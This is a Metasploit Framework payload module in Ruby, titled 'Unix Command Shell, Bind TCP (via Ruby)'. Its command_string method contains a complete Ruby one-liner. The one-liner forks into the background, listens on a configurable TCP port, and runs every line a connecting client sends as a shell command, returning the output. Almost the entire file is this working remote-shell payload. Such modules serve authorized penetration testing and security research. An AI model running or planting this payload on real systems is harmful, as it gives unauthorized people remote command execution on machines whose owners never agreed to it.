##
# $Id: bind_ruby.rb 6854 2009-07-21 15:20:35Z hdm $
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'msf/core/handler/bind_tcp'
require 'msf/base/sessions/command_shell'

module Metasploit3

	include Msf::Payload::Single

	def initialize(info = {})
		super(merge_info(info,
			'Name'        => 'Unix Command Shell, Bind TCP (via Ruby)',
			'Version'     => '$Revision: 6854 $',
			'Description' => 'Continually listen for a connection and spawn a command shell via Ruby',
			'Author'      => 'kris katterjohn',
			'License'     => MSF_LICENSE,
			'Platform'    => 'unix',
			'Arch'        => ARCH_CMD,
			'Handler'     => Msf::Handler::BindTcp,
			'Session'     => Msf::Sessions::CommandShell,
			'PayloadType' => 'cmd',
			'RequiredCmd' => 'ruby',			
			'Payload'     => { 'Offsets' => {}, 'Payload' => '' }
		))
	end

	def generate
		return super + command_string
	end

	def command_string
		"ruby -rsocket -e 'exit if fork;s=TCPServer.new(\"#{datastore['LPORT']}\");while(c=s.accept);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end;end'"
	end
end
